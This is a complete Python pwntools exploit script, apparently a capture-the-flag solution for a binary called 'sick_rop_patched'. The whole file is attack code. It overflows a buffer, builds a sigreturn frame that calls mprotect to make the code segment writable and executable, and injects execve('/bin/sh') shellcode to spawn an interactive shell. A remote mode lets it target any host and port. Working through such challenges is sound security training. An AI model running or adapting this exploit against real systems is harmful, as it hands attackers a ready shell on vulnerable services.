#!/usr/bin/env python3

from pwn import *

e = ELF("./sick_rop_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(vuln+0x1a)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(vuln)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # SROP to mprotect() + shellcode

    # The tricky parts are:
    # - After setup the overflowed stack with SROP frame, We need to first jump back to vuln to update the RAX via read()/write().
    # - Use `grep 0x40102e` to find the frame.rsp value so that we can return to vuln() and send the shellcode.

    # Stage 1: set .text RWX.
    RET_OFFSET = 40 # Found via pwn cyclic
    SYSCALL_GADGET = 0x401014  # Address of 'syscall; ret'
    TARGET_ADDR = 0x401000
    LENGTH = 0x1000
    NEW_RSP = 0x4010d8      # This address contains the pointer to the vuln(). Found it via `grep 0x40102e`.
    PROT_RWX = 7            # Read | Write | Execute
    frame = SigreturnFrame()
    frame.rax = 10          # syscall number for mprotect
    frame.rdi = TARGET_ADDR # address
    frame.rsi = LENGTH      # length
    frame.rdx = PROT_RWX    # prot
    frame.rsp = NEW_RSP
    frame.rip = SYSCALL_GADGET
    payload = flat(
            b'\x90' * RET_OFFSET,
            e.sym.vuln,     # Overwrite the ret addr of the first iteration.
                            # Note we cannot jump to the read()/write() directly otherwise the corrupted RBP will crash the process when "leave; ret" runs.
            SYSCALL_GADGET, # Overwrite the ret addr of the second iteration, where we input 15 bytes to change the eax and trigger SROP.
            bytes(frame),
            )
    r.send(payload)
    r.recvn(len(payload))
    r.send(b'A' * 15)   # SROP needs RAX to be 15.
    r.recvn(15)

    # Stage 2: write shellcode and jump to it
    # 23-byte shellcode from https://www.exploit-db.com/exploits/46907
    shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
    SHELLCODE_ADDR = 0x4010b8     # Found by debuggin.
    payload = flat(
            shellcode,
            b'\x90' * (RET_OFFSET - len(shellcode)),
            SHELLCODE_ADDR,
            )
    r.send(payload)
    r.recvn(len(payload))

    r.interactive()

if __name__ == "__main__":
    main()
